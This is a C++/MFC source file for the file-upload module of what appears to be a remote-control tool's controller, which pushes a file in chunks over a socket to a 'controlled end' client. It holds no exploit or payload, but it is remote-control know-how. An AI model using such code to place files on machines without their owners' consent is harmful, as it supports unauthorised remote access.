#include "pch.h"
#include "ModuleFileUpload.h"
#include "MFCApplication4.h"


CFileUpload::CFileUpload(CSocketClient* pSocketClient) : CModule(pSocketClient) {
	//InitializeCriticalSection(&m_WriteLock);

	// 自动重置事件，初始状态无信号
	m_hRecvPacketFileUploadInfoEvent = CreateEvent(NULL, false, false, NULL);
	m_hRecvPacketFileUploadCloseEvent = CreateEvent(NULL, false, false, NULL);
}


CFileUpload::~CFileUpload() {
	//DeleteCriticalSection(&m_WriteLock);

	if (m_hRecvPacketFileUploadInfoEvent != nullptr) {
		CloseHandle(m_hRecvPacketFileUploadInfoEvent);
		m_hRecvPacketFileUploadInfoEvent = nullptr;
	}

	if (m_hRecvPacketFileUploadCloseEvent != nullptr) {
		CloseHandle(m_hRecvPacketFileUploadCloseEvent);
		m_hRecvPacketFileUploadCloseEvent = nullptr;
	}
}


// 重写虚函数
void CFileUpload::OnRecvChildSocketClientPacket(CPacket* pPacket) {
	CSocketClient* pSocketClient = pPacket->m_pSocketClient;
	CClient* pClient = pPacket->m_pClient;

	switch (pPacket->m_PacketHead.wCommandId) {

	//case FILE_UPLOAD_CONNECT:
	//	InitModule(pSocketClient);								// 初始化组件。主要作用是把这个pSocketClient和这个组件绑定
	//	SetEvent(pClient->m_FileUploadConnectSuccessEvent);		// 触发信号
	//	break;
	case FILE_UPLOAD_INFO:
		SetEvent(m_hRecvPacketFileUploadInfoEvent);
		break;

	case FILE_UPLOAD_DATA:
		break;

	case FILE_UPLOAD_DATA_TAIL:
		break;

	case FILE_UPLOAD_CLOSE:
		SetEvent(m_hRecvPacketFileUploadCloseEvent);
		break;
	}
}


BOOL WINAPI UploadFileThreadFunc(LPVOID lParam);


typedef struct _UPLOAD_FILE_THREAD_PARAM {
	CClient*			pClient;
	WCHAR				pszFilePath[MAX_PATH];
	WCHAR				pszUploadPath[MAX_PATH];

	_UPLOAD_FILE_THREAD_PARAM(CClient* pClient, LPWSTR pszFilePath, LPWSTR pszUploadPath) {
		this->pClient = pClient;
		memcpy(this->pszFilePath, pszFilePath, MAX_PATH * 2);
		memcpy(this->pszUploadPath, pszUploadPath, MAX_PATH * 2);
	}
}UPLOAD_FILE_THREAD_PARAM;


// TODO 开了线程怎么知道是否成功上传
BOOL UploadFile(CClient* pClient, LPWSTR pszFilePath, LPWSTR pszUploadPath) {
	UPLOAD_FILE_THREAD_PARAM* lParam = new UPLOAD_FILE_THREAD_PARAM(pClient, pszFilePath, pszUploadPath);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UploadFileThreadFunc, (LPVOID)lParam, 0, NULL);
	return 0;
}


BOOL WINAPI UploadFileThreadFunc(LPVOID lParam) {
	UPLOAD_FILE_THREAD_PARAM* pThreadParam = ((UPLOAD_FILE_THREAD_PARAM*)lParam);
	WCHAR pszFilePath[MAX_PATH];
	WCHAR pszUploadPath[MAX_PATH];

	CClient* pClient = pThreadParam->pClient;
	memcpy(pszFilePath, pThreadParam->pszFilePath, MAX_PATH * 2);
	memcpy(pszUploadPath, pThreadParam->pszUploadPath, MAX_PATH * 2);

	if (lParam != nullptr) {
		delete lParam;
		lParam = nullptr;
	}


	// 选中客户端的主socket发送CONNECT包
	theApp.m_Server.SendPacket(pClient->m_pMainSocketClient, FILE_UPLOAD_CONNECT, NULL, 0);

	// 等待被控端发回CONNECT包
	WaitForSingleObject(pClient->m_FileUploadConnectSuccessEvent, INFINITE);		// TODO 后续要把这里设置成等待有限时间

	ASSERT(pClient->m_pFileUploadConnectSocketClientTemp != nullptr);
	CFileUpload* pFileUpload = new CFileUpload(pClient->m_pFileUploadConnectSocketClientTemp);
	CSocketClient* pSocketClient = pFileUpload->m_pSocketClient;


	//if (!PathFileExists(pszFilePath)) {
	//	MessageBox(0, L"文件不存在", L"", 0);
	//	return false;
	//}

	//HANDLE hFile = CreateFile(pszFilePath, FILE_READ_EA, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	//if (hFile == INVALID_HANDLE_VALUE)
	//{
	//	MessageBox(0, L"文件句柄打开失败", L"", 0);
	//	return false;
	//}

	//QWORD qwFileSize = 0;
	//DWORD dwFileSizeLowDword = 0;
	//DWORD dwFileSizeHighDword = 0;
	//dwFileSizeLowDword = GetFileSize(hFile, &dwFileSizeHighDword);
	//qwFileSize = (((QWORD)dwFileSizeHighDword) << 32) + dwFileSizeLowDword;		// 直接dwFileSizeHighDword << 32的话就等于0了


	CFile File;
	BOOL bRet = File.Open(pszFilePath, File.shareDenyNone, NULL);			// 共享读
	if (!bRet) {
		MessageBox(0, L"文件打开失败", L"文件打开失败", 0);
		return false;
	}

	QWORD qwFileSize = File.GetLength();

	BYTE pbPacketBody[FILE_UPLOAD_INFO_PACKET_BODY_LENGTH];
	ZeroMemory(pbPacketBody, sizeof(pbPacketBody));
	// FILE_UPLOAD_INFO包体：文件大小（8字节）+ 分片数（4字节）+ 暂空（4字节）+ 上传到的路径（MAX_PATH 字节）

	// 除非文件16383TB, 否则dwPacketSplitNum不可能上溢。所以不用担心整数溢出。担心这个还不如担心文件完整性校验。
	DWORD dwPacketSplitNum = (qwFileSize % PACKET_BODY_MAX_LENGTH) ? qwFileSize / PACKET_BODY_MAX_LENGTH + 1 : qwFileSize / PACKET_BODY_MAX_LENGTH;
	WriteQwordToBuffer(pbPacketBody, qwFileSize, 0);
	WriteDwordToBuffer(pbPacketBody, dwPacketSplitNum, 8);
	memcpy(pbPacketBody + 16, pszUploadPath, MAX_PATH * 2);

	// 子socket发送FILE_UPLOAD_INFO包
	theApp.m_Server.SendPacket(pSocketClient, FILE_UPLOAD_INFO, (PBYTE)pbPacketBody, FILE_UPLOAD_INFO_PACKET_BODY_LENGTH);

	// 等待被控端发回FILE_UPLOAD_INFO包
	WaitForSingleObject(pFileUpload->m_hRecvPacketFileUploadInfoEvent, INFINITE);

	PBYTE pbBuffer = new BYTE[PACKET_BODY_MAX_LENGTH];

	// 上传文件数据
	for (DWORD dwSplitIndex = 0; dwSplitIndex < dwPacketSplitNum; dwSplitIndex++) {

		// 不是最后一个分片
		if (dwSplitIndex != dwPacketSplitNum - 1) {
			File.Read(pbBuffer, PACKET_BODY_MAX_LENGTH);
			theApp.m_Server.SendPacket(pSocketClient, FILE_UPLOAD_DATA, pbBuffer, PACKET_BODY_MAX_LENGTH);
		}
		// 最后一个分片
		else {
			DWORD dwReadBytes = qwFileSize % PACKET_BODY_MAX_LENGTH ? qwFileSize % PACKET_BODY_MAX_LENGTH : PACKET_BODY_MAX_LENGTH;
			File.Read(pbBuffer, dwReadBytes);
			theApp.m_Server.SendPacket(pSocketClient, FILE_UPLOAD_DATA_TAIL, pbBuffer, dwReadBytes);
		}
	}

	File.Close();

	if (pbBuffer != nullptr) {
		delete[] pbBuffer;
		pbBuffer = nullptr;
	}

	theApp.m_Server.SendPacket(pSocketClient, FILE_UPLOAD_CLOSE, NULL, 0);

	WaitForSingleObject(pFileUpload->m_hRecvPacketFileUploadCloseEvent, INFINITE);

	if (pFileUpload != nullptr) {
		delete pFileUpload;
		pFileUpload = nullptr;
	}

	return true;
}